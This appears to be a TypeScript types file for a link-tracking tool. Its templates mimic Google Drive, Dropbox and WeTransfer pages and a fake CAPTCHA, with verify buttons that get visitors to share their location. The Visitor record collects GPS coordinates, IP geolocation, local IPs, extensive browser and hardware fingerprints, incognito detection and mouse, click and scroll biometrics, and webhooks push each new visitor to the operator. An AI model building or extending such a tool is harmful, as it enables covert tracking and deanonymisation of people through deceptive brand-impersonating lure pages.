export interface RedirectTemplateOptions {
  loadingMessage?: string;
  subMessage?: string;
}

export interface GdriveTemplateOptions {
  fileName?: string;
  fileType?: 'pdf' | 'doc' | 'sheet' | 'slide' | 'image' | 'zip';
  fileSize?: string;
  ownerEmail?: string;
  message?: string;
}

export interface DropboxTemplateOptions {
  folderName?: string;
  ownerEmail?: string;
  message?: string;
}

export interface CaptchaTemplateOptions {
  siteTitle?: string;
  message?: string;
}

export interface WetransferTemplateOptions {
  fileName?: string;
  fileSize?: string;
  senderEmail?: string;
}

export interface Domain {
  id: number;
  domain: string;
  isActive: boolean;
  createdAt: string;
}

export interface CreateDomainInput {
  domain: string;
}

export interface Link {
  id: number;
  slug: string;
  targetUrl: string;
  templateId: 'redirect' | 'gdrive' | 'dropbox' | 'captcha' | 'wetransfer';
  title: string | null;
  templateOptions: string | null;
  gpsMode: 'required' | 'optional' | 'disabled';
  domainId: number | null;
  isActive: boolean;
  visitCount: number;
  expiresAt: string | null;
  maxVisits: number | null;
  createdAt: string;
}

export interface CreateLinkInput {
  targetUrl: string;
  templateId: 'redirect' | 'gdrive' | 'dropbox' | 'captcha' | 'wetransfer';
  title?: string;
  templateOptions?: RedirectTemplateOptions | GdriveTemplateOptions | DropboxTemplateOptions | CaptchaTemplateOptions | WetransferTemplateOptions;
  gpsMode?: 'required' | 'optional' | 'disabled';
  domainId?: number;
  expiresAt?: string | null;
  maxVisits?: number | null;
}

export interface Visitor {
  id: number;
  linkId: number;
  ip: string | null;
  userAgent: string | null;
  browser: string | null;
  browserVersion: string | null;
  os: string | null;
  platform: string | null;
  cpuCores: number | null;
  ram: number | null;
  screenWidth: number | null;
  screenHeight: number | null;
  colorDepth: number | null;
  gpuVendor: string | null;
  gpuRenderer: string | null;
  canvasHash: string | null;
  touchSupport: boolean | null;
  language: string | null;
  timezone: string | null;
  cookiesEnabled: boolean | null;
  doNotTrack: boolean | null;
  // New fingerprint fields
  audioHash: string | null;
  webglMaxTextureSize: number | null;
  webglMaxViewportWidth: number | null;
  webglMaxViewportHeight: number | null;
  webglExtensions: string | null;
  webglShaderPrecision: string | null;
  // Network
  connectionType: string | null;
  downlinkSpeed: number | null;
  networkRtt: number | null;
  saveData: boolean | null;
  // Media devices
  cameraCount: number | null;
  microphoneCount: number | null;
  speakerCount: number | null;
  // Screen extended
  screenAvailWidth: number | null;
  screenAvailHeight: number | null;
  pixelDepth: number | null;
  devicePixelRatio: number | null;
  screenOrientation: string | null;
  // Navigator extended
  vendor: string | null;
  isOnline: boolean | null;
  pdfViewerEnabled: boolean | null;
  webdriverDetected: boolean | null;
  // Storage
  storageQuota: number | null;
  storageUsage: number | null;
  installedLanguages: string | null;
  // Permissions
  permGeolocation: string | null;
  permCamera: string | null;
  permMicrophone: string | null;
  permNotifications: string | null;
  // Other
  referrer: string | null;
  pageLoadTime: number | null;
  adBlockerDetected: boolean | null;
  incognitoDetected: boolean | null;
  // Deep fingerprinting
  localIPs: string | null;
  speechVoicesHash: string | null;
  detectedFonts: string | null;
  // CSS Media Queries
  prefersColorScheme: string | null;
  prefersReducedMotion: boolean | null;
  hdrSupport: boolean | null;
  forcedColors: boolean | null;
  pointerType: string | null;
  colorGamut: string | null;
  // Client Hints
  clientArch: string | null;
  clientBitness: string | null;
  clientPlatformVersion: string | null;
  clientModel: string | null;
  // Battery
  batteryLevel: number | null;
  batteryCharging: boolean | null;
  // Intl & Memory
  intlLocaleFingerprint: string | null;
  jsHeapSizeLimit: number | null;
  // Extended screen & touch
  multiMonitor: boolean | null;
  maxTouchPoints: number | null;
  // Plugins & APIs
  installedPlugins: string | null;
  apiSupport: string | null;
  // Extended timezone
  timezoneOffset: number | null;
  observesDst: boolean | null;
  // Navigation & input
  navigationType: string | null;
  keyboardLayout: string | null;
  // Advanced fingerprints
  mathFingerprint: string | null;
  domRectFingerprint: string | null;
  mediaCodecFingerprint: string | null;
  audioContextProps: string | null;
  cssSystemColorFingerprint: string | null;
  webgl2Fingerprint: string | null;
  svgFilterFingerprint: string | null;
  errorMessageFingerprint: string | null;
  wasmCapabilities: string | null;
  scrollbarWidth: number | null;
  timerResolution: string | null;
  textMetricsFingerprint: string | null;
  dateToStringFingerprint: string | null;
  emojiSupportFingerprint: string | null;
  perfEntryTypes: string | null;
  securityContext: string | null;
  cssSupportFingerprint: string | null;
  lineBreakFingerprint: string | null;
  // Behavioral biometrics
  mouseData: string | null;
  clickData: string | null;
  scrollData: string | null;
  touchData: string | null;
  motionData: string | null;
  dwellTime: number | null;
  focusData: string | null;
  // Server-side analysis
  botScore: number | null;
  vpnDetected: boolean | null;
  privacyScore: number | null;
  deviceTier: string | null;
  browserAuthenticity: string | null;
  uniquenessScore: number | null;
  locationConsistency: string | null;
  humanScore: number | null;
  userProfile: string | null;
  riskFlags: string | null;
  // GPS
  gpsGranted: boolean;
  latitude: number | null;
  longitude: number | null;
  accuracy: number | null;
  altitude: number | null;
  altitudeAccuracy: number | null;
  speed: number | null;
  heading: number | null;
  // IP geolocation
  ipCity: string | null;
  ipRegion: string | null;
  ipCountry: string | null;
  ipCountryCode: string | null;
  ipLat: number | null;
  ipLon: number | null;
  ipIsp: string | null;
  createdAt: string;
  // Joined fields
  linkSlug?: string;
  linkTitle?: string;
}

export interface Stats {
  totalLinks: number;
  totalVisitors: number;
  gpsGrantedCount: number;
  gpsGrantRate: number;
  visitorsToday: number;
  topBrowsers: { name: string; count: number }[];
  topOS: { name: string; count: number }[];
  visitorsPerDay: { date: string; count: number }[];
}

export interface Webhook {
  id: number;
  url: string;
  events: string[];
  secret: string | null;
  isActive: boolean;
  createdAt: string;
}

export interface AuditLog {
  id: number;
  adminId: number | null;
  action: string;
  targetType: string | null;
  targetId: number | null;
  details: string | null;
  createdAt: string;
}

export const VALID_TEMPLATE_IDS = ['redirect', 'gdrive', 'dropbox', 'captcha', 'wetransfer'] as const;
export const VALID_GPS_MODES = ['required', 'optional', 'disabled'] as const;

export type TemplateId = typeof VALID_TEMPLATE_IDS[number];
export type GpsMode = typeof VALID_GPS_MODES[number];

export interface TemplateInfo {
  id: TemplateId;
  name: string;
  description: string;
}

export const TEMPLATES: TemplateInfo[] = [
  {
    id: 'redirect',
    name: 'Redirect',
    description: 'Shows a loading spinner, requests location, then redirects to target URL',
  },
  {
    id: 'gdrive',
    name: 'Google Drive',
    description: 'Mimics a Google Drive file page with a verify button that requests location',
  },
  {
    id: 'dropbox',
    name: 'Dropbox',
    description: 'Mimics a Dropbox shared folder invitation with a verify button',
  },
  {
    id: 'captcha',
    name: 'CAPTCHA',
    description: 'Shows a "Verify you are human" page with a fake CAPTCHA checkbox',
  },
  {
    id: 'wetransfer',
    name: 'WeTransfer',
    description: 'Mimics a WeTransfer download page with a download button',
  },
];

export interface WsMessage {
  type: 'new_visitor';
  data: Visitor;
}
